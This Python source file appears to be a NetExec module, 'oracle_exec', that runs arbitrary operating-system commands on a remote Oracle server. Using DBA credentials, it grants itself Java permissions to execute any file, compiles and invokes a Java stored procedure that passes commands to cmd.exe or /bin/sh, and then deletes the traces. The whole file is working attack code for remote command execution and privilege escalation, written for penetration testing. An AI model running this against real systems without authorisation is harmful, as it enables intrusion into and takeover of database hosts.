from nxc.helpers.misc import CATEGORY


class NXCModule:
    """Execute OS commands on the remote Oracle host via Java stored procedures."""

    name = "oracle_exec"
    description = "Execute OS commands via Oracle Java stored procedures — non-interactive, no reverse shell (requires DBA/SYSDBA)"
    supported_protocols = ["oracle"]
    opsec_safe = False
    category = CATEGORY.PRIVILEGE_ESCALATION

    def __init__(self, context=None, module_options=None):
        self.context = context
        self.module_options = module_options
        self.cmd = None

    def options(self, context, module_options):
        """CMD    OS command to execute on the remote host"""
        if "CMD" not in module_options:
            context.log.fail("CMD option is required — use -o CMD='<command>'")
            return
        self.cmd = module_options["CMD"]

    def on_admin_login(self, context, connection):
        if not self.cmd:
            context.log.fail("No command specified — use -o CMD='<command>'")
            return

        conn = connection.conn
        log = context.log

        if not self.java_available(conn, log):
            log.fail("Java is not enabled on this Oracle instance — cannot execute OS commands via Java stored procedures")
            return

        try:
            self.grant_java_perms(conn, log)
            self.create_java_source(conn, log)
            self.create_wrapper(conn, log)
            output = self.run_cmd(conn, log)
            if output is not None:
                if output:
                    for line in output.splitlines():
                        log.highlight(line)
                else:
                    log.display("(no output)")
        except Exception as e:
            log.fail(f"Execution error: {e}")
        finally:
            self.cleanup(conn, log)

    def java_available(self, conn, log):
        try:
            cursor = conn.cursor()
            cursor.execute(
                "SELECT count(*) FROM dba_objects "
                "WHERE object_name = 'DBMS_JAVA' AND object_type = 'PACKAGE'"
            )
            row = cursor.fetchone()
            cursor.close()
            return row is not None and row[0] > 0
        except Exception as e:
            log.debug(f"Could not check Java availability: {e}")
            return False

    def grant_java_perms(self, conn, log):
        cursor = conn.cursor()
        cursor.execute("SELECT user FROM dual")
        current_user = cursor.fetchone()[0]
        cursor.close()

        perms = [
            (current_user, "SYS:java.lang.RuntimePermission", "writeFileDescriptor", ""),
            (current_user, "SYS:java.io.FilePermission", "<<ALL FILES>>", "execute"),
        ]
        for grantee, perm, target, action in perms:
            try:
                cursor = conn.cursor()
                cursor.callproc("DBMS_JAVA.grant_permission", [grantee, perm, target, action])
                conn.commit()
                cursor.close()
            except Exception as e:
                log.debug(f"Java permission grant ({perm}): {e}")

    def create_java_source(self, conn, log):
        # Drop any orphaned compiled class left behind by a previous DROP JAVA SOURCE
        for drop in ('DROP JAVA CLASS "NxcOsCmd"', "DROP FUNCTION nxc_oscmd"):
            try:
                cursor = conn.cursor()
                cursor.execute(drop)
                cursor.close()
            except Exception:
                pass

        src = (
            'CREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED "NxcOsCmd" AS\n'
            "import java.io.*;\n"
            "public class NxcOsCmd {\n"
            "    public static String exec(String cmd) throws Exception {\n"
            "        String[] shell;\n"
            '        String os = System.getProperty("os.name").toLowerCase();\n'
            '        if (os.contains("windows")) {\n'
            '            shell = new String[]{"cmd.exe", "/c", cmd};\n'
            "        } else {\n"
            '            shell = new String[]{"/bin/sh", "-c",\n'
            '                "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; " + cmd};\n'
            "        }\n"
            "        ProcessBuilder pb = new ProcessBuilder(shell);\n"
            "        pb.redirectErrorStream(true);\n"
            "        Process p = pb.start();\n"
            "        BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));\n"
            "        StringBuilder sb = new StringBuilder();\n"
            "        String line;\n"
            '        while ((line = br.readLine()) != null) sb.append(line).append("\\n");\n'
            "        p.waitFor();\n"
            '        if (sb.length() > 32000) return sb.substring(0, 32000) + "... (truncated)";\n'
            "        return sb.toString().trim();\n"
            "    }\n"
            "}"
        )
        cursor = conn.cursor()
        cursor.execute(src)
        cursor.close()

        # CREATE JAVA SOURCE never raises on compilation failure — check explicitly
        cursor = conn.cursor()
        cursor.execute(
            "SELECT status FROM user_objects WHERE object_name = 'NxcOsCmd' AND object_type = 'JAVA CLASS'"
        )
        row = cursor.fetchone()
        cursor.close()
        if not row or row[0] != "VALID":
            cursor = conn.cursor()
            cursor.execute("SELECT text FROM user_errors WHERE name = 'NxcOsCmd' ORDER BY sequence")
            errors = "; ".join(r[0].strip() for r in cursor.fetchall())
            cursor.close()
            raise RuntimeError(f"Java compilation failed: {errors or 'no details available'}")

    def create_wrapper(self, conn, log):
        # PL/SQL DDL (CREATE FUNCTION) requires a trailing semicolon, unlike SQL DDL
        cursor = conn.cursor()
        cursor.execute(
            "CREATE OR REPLACE FUNCTION nxc_oscmd(p_cmd IN VARCHAR2) RETURN VARCHAR2 "
            "AS LANGUAGE JAVA NAME 'NxcOsCmd.exec(java.lang.String) return java.lang.String';"
        )
        cursor.close()

    def run_cmd(self, conn, log):
        cursor = conn.cursor()
        output = cursor.callfunc("nxc_oscmd", str, [self.cmd])
        cursor.close()
        return output

    def cleanup(self, conn, log):
        for stmt in (
            "DROP FUNCTION nxc_oscmd",
            'DROP JAVA SOURCE "NxcOsCmd"',
            'DROP JAVA CLASS "NxcOsCmd"',
        ):
            try:
                cursor = conn.cursor()
                cursor.execute(stmt)
                conn.commit()
                cursor.close()
            except Exception as e:
                log.debug(f"Cleanup ({stmt[:25]}): {e}")
